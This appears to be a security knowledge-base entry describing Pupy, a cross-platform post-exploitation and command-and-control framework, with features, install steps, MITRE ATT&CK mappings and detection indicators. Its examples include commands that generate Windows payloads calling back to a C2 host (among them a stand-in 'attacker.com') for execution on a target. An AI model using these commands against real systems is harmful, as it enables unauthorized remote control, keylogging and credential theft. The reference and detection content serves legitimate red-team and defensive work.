---
id: 73ca0f30-e096-432c-b8f9-0448179f12a8
type: tool
verified: true
created_at: '2019-08-28T21:17:37.045124+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
  - Linux
  - macOS
  - Android
tags:
  - post-exploitation
  - c2
  - remote-administration
  - cross-platform
url: 'https://github.com/n1nj4sec/pupy'
validated: true
---

# Pupy

**Status**: Unverified

## Overview

Pupy is an open-source, cross-platform remote administration and post-exploitation tool primarily written in Python. It supports Windows, Linux, macOS, and Android, providing a flexible C2 framework for generating payloads, managing sessions, and executing modules during security assessments.

## Description

Pupy functions as a modern post-exploitation framework similar to Meterpreter, with a focus on evasion and modularity. It allows operators to generate platform-specific payloads that connect back to a central server, enabling interactive shells, file transfers, keylogging, privilege escalation, and more. Its Python-based architecture supports in-memory execution to reduce disk footprints and detection risks.

## Features

- Feature 1: Cross-platform payload generation for Windows (EXE, DLL), Linux (ELF), macOS, and Android (APK).
- Feature 2: Interactive shell with module loading for tasks like screenshot capture, credential dumping, and persistence.
- Feature 3: Transport obfuscation (HTTP, HTTPS, TCP) and interactive shell over various protocols to bypass network restrictions.
- Feature 4: In-memory execution and process migration to avoid antivirus detection.
- Feature 5: Built-in modules for common post-exploitation activities, including keyloggers, mimikatz integration, and lateral movement.

## Installation

### Requirements

- Python 2.7 or 3.x
- Git
- pip and setuptools
- For Windows payloads: Wine (on Linux host) or native Windows environment
- Additional dependencies: pyinstaller, pycrypto, etc. (installed via setup.py)

### Install Commands

```bash
# Clone the repository
git clone --recursive https://github.com/n1nj4sec/pupy.git
cd pupy

# Install dependencies and setup
pip install -r requirements.txt
python setup.py install

# For Kali Linux (common for pentesting)
# Pupy is available in some repos, but building from source is recommended for latest features
```

On Windows: Use a Python environment and run setup.py directly.

## Basic Usage

```bash
pupygen payload -f windows/executable -o payload.exe
```

Start server:
```bash
pupy manage --start-server --host 0.0.0.0 --port 1337
```

Interact:
```bash
pupy shell
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| --verbose | Enable verbose logging |
| --debug | Run in debug mode for troubleshooting |

## Examples

### Example 1: Basic Usage

Generate and deploy a simple Windows payload:
```bash
pupygen payload -f windows/executable -o /tmp/pupy.exe --host 192.168.1.100 --port 4444
# Transfer pupy.exe to target and execute
pupy manage --start-server --host 0.0.0.0 --port 4444
pupy shell  # Interact once connected
```

### Example 2: Advanced Usage

Generate obfuscated payload and use HTTPS transport:
```bash
pupygen payload -f windows/executable -o /tmp/pupy_https.exe --transport http --host attacker.com
# Configure server with SSL certs if needed
pupy manage --start-server --host 0.0.0.0 --port 443 --transport-config ssl_cert=path/to/cert.pem
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[PowerShell]] Command and Scripting Interpreter: PowerShell
- [[Web Protocols]] Application Layer Protocol: Web Protocols
- [[Windows Remote Management]] Remote Services: Windows Remote Management
- [[Boot or Logon Autostart Execution]] Boot or Logon Autostart Execution

### Tactics

- [[Execution]] Execution
- [[Persistence]] Persistence
- [[Privilege Escalation]] Privilege Escalation
- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Network traffic to non-standard ports (e.g., 1337) with Python-like payloads or HTTP beacons.
- Detection method 2: Process anomalies like in-memory Python execution or unusual child processes from legitimate apps.
- Detection method 3: File artifacts from payload generation (e.g., temporary EXEs with Python stubs) or module logs.
- Detection method 4: Behavioral analysis for keylogging, screenshot captures, or credential dumping via integrated tools like Mimikatz.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Meterpreter]]
- [[tools/Empire]]
- [[tools/Covenant]]

## References

- Official GitHub: https://github.com/n1nj4sec/pupy
- Documentation: https://pupy.readthedocs.io/
- Related resources: Black Hat presentations on Pupy architecture
